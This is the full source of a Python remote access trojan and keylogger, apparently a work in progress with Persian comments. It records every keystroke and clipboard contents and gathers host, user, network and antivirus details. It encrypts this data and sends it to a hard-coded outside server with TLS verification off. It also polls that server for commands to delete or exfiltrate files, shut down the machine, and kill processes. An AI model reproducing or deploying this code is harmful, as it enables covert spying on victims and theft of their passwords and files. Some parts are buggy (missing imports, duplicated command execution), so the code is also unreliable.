Folder Structure:
├── [DIR] commands
    └── [FILE] handler.py
├── [FILE] config.py
├── [DIR] encryption
    └── [FILE] manager.py
├── [FILE] main.py
├── [DIR] monitoring
    └── [FILE] logger.py
├── [DIR] network
    └── [FILE] communicator.py
├── [DIR] system
    └── [FILE] collector.py


File Contents:
----------------------------------------
File: D:\rat\config.py
----------------------------------------
import base64
import os
import platform
import hashlib

class Config:
    # Connection Settings
    SERVER_URL = "https://fasitheme.ir/logger/api.php"
    SECRET_TOKEN = "1"
    CHECK_INTERVAL = 120  # seconds
    COMMAND_POLL_INTERVAL = 10  # seconds
    COMMAND_TIMEOUT = 10  # seconds, added for HTTP request timeout
    
    # Security Settings
    ENCRYPTION_KEY = base64.b64decode("nTds2GHvEWeOGJibjZuaf8kY5T5YWyfMx4J3B1NA0Jo=")
    IV_LENGTH = 16
    BUFFER_LIMIT = 100  # max keystrokes before flush
    
    # System Settings
    EMERGENCY_HOTKEY = "ctrl+alt+shift+k"
    ERROR_LOG_FILE = "errors.log"
    MAX_ERROR_LOG_SIZE = 1024 * 1024  # 1MB
    
    @staticmethod
    def get_client_id():
        unique_str = f"{platform.node()}-{os.getlogin()}"
        return hashlib.sha256(unique_str.encode()).hexdigest()[:32]

----------------------------------------
File: D:\rat\main.py
----------------------------------------
# ------------ main.py ------------
import threading
import time
import json
import logging
import sys
from keyboard import hook, add_hotkey
from config import Config
from encryption.manager import EncryptionManager, EncryptionError
from network.communicator import ServerCommunicator, CommunicationError
from system.collector import SystemCollector
from commands.handler import CommandHandler, CommandError
from monitoring.logger import ActivityLogger

class KeyloggerCore:
    def __init__(self):
        self.client_id = Config.get_client_id()
        self.encryption = EncryptionManager(Config.ENCRYPTION_KEY)
        self.communicator = ServerCommunicator(self.client_id, self.encryption)
        self.logger = ActivityLogger(Config.BUFFER_LIMIT)
        self.running = True

    def start(self):
        self._init_hotkeys()
        self._start_service_threads()
        self._main_loop()

    def _init_hotkeys(self):
        add_hotkey(Config.EMERGENCY_HOTKEY, self.emergency_stop)
        hook(self.logger.log_keystroke)

    def _start_service_threads(self):
        threading.Thread(target=self._data_sync_loop, daemon=True).start()
        threading.Thread(target=self._command_loop, daemon=True).start()
        threading.Thread(target=self._clipboard_monitor_loop, daemon=True).start()

    def _data_sync_loop(self):
        while self.running:
            try:
                # جمع‌آوری اطلاعات سیستمی
                system_info = SystemCollector.collect_full()

                # گرفتن اسکرین‌شات (نیاز به پیاده‌سازی)
                # screenshot = self._capture_screenshot()

                # ارسال داده‌ها
                self.communicator.upload_data(
                    keystrokes=self.logger.buffer.copy(),
                    system_info=system_info,
                    # screenshot=screenshot
                )

                self.logger.buffer.clear()
                time.sleep(Config.CHECK_INTERVAL)

            except Exception as e:
                self._handle_error(f"Sync error: {str(e)}")
                
    def _command_loop(self):
        while self.running:
            try:
                commands = self.communicator.fetch_commands()
                if commands:
                    self._process_commands(commands)
                time.sleep(Config.COMMAND_POLL_INTERVAL)
            except Exception as e:
                self._handle_error(f"Command processing error: {str(e)}")

    def _clipboard_monitor_loop(self):
        while self.running:
            try:
                self.logger.log_clipboard()
                time.sleep(10)
            except Exception as e:
                self._handle_error(f"Clipboard monitor error: {str(e)}")

    def _process_commands(self, commands):
        for cmd in commands:
            try:
                # اعتبارسنجی فیلدهای ضروری
                if 'type' not in cmd or 'command' not in cmd:
                    raise CommandError("Invalid command structure")

                decrypted = self.encryption.decrypt(cmd['command'])
                command_data = json.loads(decrypted)

                # اعتبارسنجی ساختار دستور
                if 'type' not in command_data:
                    raise CommandError("Missing 'type' in decrypted command")

                result = CommandHandler.execute(
                    cmd['type'],  # یا command_data['type'] بسته به طراحی
                    command_data
                )
                logging.info(f"Received command: {cmd}")  # لاگ داده خام
                decrypted = self.encryption.decrypt(cmd['command'])
                logging.info(f"Decrypted command: {decrypted}")  # لاگ داده رمزگشایی‌شده
                command_data = json.loads(decrypted)
                logging.info(f"Parsed command data: {command_data}")  # لاگ داده JSON
                result = CommandHandler.execute(
                    command_data['type'],  # اینجا از command_data استفاده می‌کنیم
                    command_data['params']
                )
                self.communicator.send_command_result(cmd['id'], result)

            except (KeyError, JSONDecodeError) as e:
                self._handle_error(f"Invalid command format: {str(e)}")
            except Exception as e:
                self._handle_error(f"Command execution failed: {str(e)}")

    def _handle_error(self, message):
        logging.error(message)

    def emergency_stop(self):
        self.running = False
        logging.info("Emergency stop activated")
        sys.exit(0)

    def _main_loop(self):
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.emergency_stop()

if __name__ == "__main__":
    keylogger = KeyloggerCore()
    keylogger.start()

----------------------------------------
File: D:\rat\commands\handler.py
----------------------------------------
# ------------ commands/handler.py ------------
import os
import psutil
import webbrowser
import shutil

class CommandHandler:
    @staticmethod
    def execute(command_type, parameters):
        handler = getattr(CommandHandler, f"handle_{command_type}", None)
        if handler:
            return handler(parameters)
        raise CommandError(f"Unknown command type: {command_type}")

    @staticmethod
    def handle_file_operation(params):
        action = params.get('action')
        path = params.get('path')
        
        if action == 'delete':
            os.remove(path)
            return {"status": "success"}
        elif action == 'download':
            with open(path, 'rb') as f:
                return {"content": base64.b64encode(f.read()).decode()}
        elif action == 'upload':
            # Implementation for file upload
            pass
        else:
            raise CommandError(f"Invalid file action: {action}")

    @staticmethod
    def handle_system_command(params):
        command = params.get('command')
        
        if command == 'shutdown':
            os.system("shutdown /s /t 1")
        elif command == 'restart':
            os.system("shutdown /r /t 1")
        elif command == 'sleep':
            os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
        elif command == 'signout':
            os.system("shutdown /l")
        else:
            raise CommandError(f"Unknown system command: {command}")
            
        return {"status": "success"}

    @staticmethod
    def handle_process_management(params):
        action = params.get('action')
        
        if action == 'list':
            return {
                "processes": [
                    proc.info for proc in psutil.process_iter(
                        ['pid', 'name', 'status']
                    )
                ]
            }
        elif action == 'terminate':
            psutil.Process(params['pid']).terminate()
            return {"status": "success"}
        else:
            raise CommandError(f"Invalid process action: {action}")

class CommandError(Exception):
    pass

----------------------------------------
File: D:\rat\encryption\manager.py
----------------------------------------
# ------------ encryption/manager.py ------------
import base64
import hashlib
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from config import Config  # اضافه کردن ایمپورت


class EncryptionManager:
    def __init__(self, encryption_key):
        self.key = encryption_key
        self._validate_key()

    def _validate_key(self):
        if len(self.key) != 32:
            raise ValueError("Encryption key must be 32 bytes")

    def encrypt(self, plaintext):
        try:
            iv = os.urandom(Config.IV_LENGTH)
            cipher = Cipher(algorithms.AES(self.key), modes.CBC(iv), backend=default_backend())
            encryptor = cipher.encryptor()
            
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(plaintext.encode()) + padder.finalize()
            
            ciphertext = encryptor.update(padded_data) + encryptor.finalize()
            return f"{base64.b64encode(ciphertext).decode()}::{base64.b64encode(iv).decode()}"
        except Exception as e:
            raise EncryptionError(f"Encryption failed: {str(e)}")

    def decrypt(self, encrypted_data):
        try:
            ciphertext_b64, iv_b64 = encrypted_data.split('::')
            ciphertext = base64.b64decode(ciphertext_b64)
            iv = base64.b64decode(iv_b64)
            
            cipher = Cipher(algorithms.AES(self.key), modes.CBC(iv), backend=default_backend())
            decryptor = cipher.decryptor()
            
            decrypted = decryptor.update(ciphertext) + decryptor.finalize()
            
            unpadder = padding.PKCS7(128).unpadder()
            return (unpadder.update(decrypted) + unpadder.finalize()).decode()
        except Exception as e:
            raise EncryptionError(f"Decryption failed: {str(e)}")

class EncryptionError(Exception):
    pass

----------------------------------------
File: D:\rat\monitoring\logger.py
----------------------------------------
# ------------ monitoring/logger.py ------------
from datetime import datetime
import pyperclip
import logging

class ActivityLogger:
    def __init__(self, buffer_limit):
        self.buffer = []
        self.buffer_limit = buffer_limit

    def log_keystroke(self, event):
        if event.event_type == 'down':
            self.buffer.append(event.name)
            if len(self.buffer) >= self.buffer_limit:
                self.flush_buffer()

    def log_clipboard(self):
        try:
            content = pyperclip.paste()[:1000]
            if content:
                self.buffer.append(f"[CLIPBOARD]{content}")
        except Exception as e:
            logging.error(f"Clipboard monitoring error: {str(e)}")

    def flush_buffer(self):
        if self.buffer:
            try:
                from system.collector import SystemCollector
                from network.communicator import ServerCommunicator
                
                system_info = SystemCollector.collect_full()
                # ارسال داده‌های کیلاگر
                ServerCommunicator.upload_data(
                    keystrokes=self.buffer.copy(),
                    system_info=system_info
                )
                self.buffer.clear()
            except Exception as e:
                logging.error(f"Failed to upload data: {str(e)}")

----------------------------------------
File: D:\rat\network\communicator.py
----------------------------------------
# ------------ network/communicator.py ------------
import requests
import json
from config import Config
import warnings
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

class ServerCommunicator:
    def __init__(self, client_id, encryption_manager):
        self.client_id = client_id
        self.encryption = encryption_manager

    def _send_request(self, endpoint, data=None, files=None):
        try:
            response = requests.post(
                f"{Config.SERVER_URL}/{endpoint}",
                data=data,
                files=files,
                verify=False,  # برای محیط لوکال، بعداً SSL را فعال کنید
                timeout=Config.COMMAND_TIMEOUT
            )
            return self._handle_response(response)
        except requests.exceptions.RequestException as e:
            raise CommunicationError(f"Connection error: {str(e)}")

    def _handle_response(self, response):
        if response.status_code == 200:
            try:
                data = response.json()
                if not isinstance(data, dict) or 'commands' not in data:
                    raise CommunicationError("Invalid response format: 'commands' key missing")
                return data['commands']  # فقط لیست دستورات را برگردانید
            except json.JSONDecodeError:
                raise CommunicationError("Invalid JSON response")
        else:
            raise CommunicationError(f"Server error: {response.status_code}")

    def upload_data(self, keystrokes, system_info, screenshot=None):
        try:
            encrypted_data = {
                "action": "upload_data",  # اضافه کردن اکشن الزامی
                "client_id": self.client_id,
                "token": Config.SECRET_TOKEN,
                "keystrokes": self.encryption.encrypt(' '.join(keystrokes)),
                "system_info": self.encryption.encrypt(json.dumps(system_info))
            }
    
            files = {}
            if screenshot:
                files['screenshot'] = ('screenshot.png', screenshot, 'image/png')
    
            response = requests.post(
                Config.SERVER_URL,
                data=encrypted_data,
                files=files,
                timeout=Config.COMMAND_TIMEOUT,
                verify=False
            )
            
            if response.status_code != 200:
                raise CommunicationError(f"Upload failed: {response.text}")
                
        except Exception as e:
            raise CommunicationError(f"Upload error: {str(e)}")
    def fetch_commands(self):
        response = self._send_request(
            "commands",
            data={
                "action": "get_commands",
                "client_id": self.client_id,
                "token": Config.SECRET_TOKEN
            }
        )
        
        # اعتبارسنجی ساختار پاسخ
        if not isinstance(response, list):
            raise CommunicationError("Invalid commands format")
            
        validated_commands = []
        for cmd in response:
            if not all(k in cmd for k in ('id', 'command', 'type')):
                continue  # یا خطا ثبت کنید
            validated_commands.append(cmd)
        
        return validated_commands

    def send_command_result(self, command_id, result):
        return self._send_request(
            "command_response",
            data={
                "command_id": command_id,
                "result": self.encryption.encrypt(json.dumps(result)),
                "token": Config.SECRET_TOKEN
            }
        )

class CommunicationError(Exception):
    pass

----------------------------------------
File: D:\rat\system\collector.py
----------------------------------------
# ------------ system/collector.py ------------
import platform
import psutil
import winreg
import os
import requests
from config import Config  # اضافه کردن ایمپورت


class SystemCollector:
    @staticmethod
    def get_platform_info():
        return {
            "os": platform.system(),
            "version": platform.version(),
            "architecture": platform.architecture(),
            "hostname": platform.node(),
            "user": os.getlogin()
        }

    @staticmethod
    def get_hardware_info():
        return {
            "cpu_cores": os.cpu_count(),
            "total_memory": psutil.virtual_memory().total,
            "disk_usage": psutil.disk_usage('/')._asdict()
        }

    @staticmethod
    def get_network_info():
        try:
            return {
                "ip_address": requests.get('https://fasitheme.ir/ip.php', timeout=5).text,
                "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)])
            }
        except:
            return {"ip_address": "unknown"}

    @staticmethod
    def get_security_info():
        try:
            winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows Defender")
            return {"antivirus": "Windows Defender"}
        except:
            return {"antivirus": "Unknown"}

    @staticmethod
    def collect_full():
        return {
            **SystemCollector.get_platform_info(),
            **SystemCollector.get_hardware_info(),
            **SystemCollector.get_network_info(),
            **SystemCollector.get_security_info(),
            "timestamp": datetime.now().isoformat()
        }
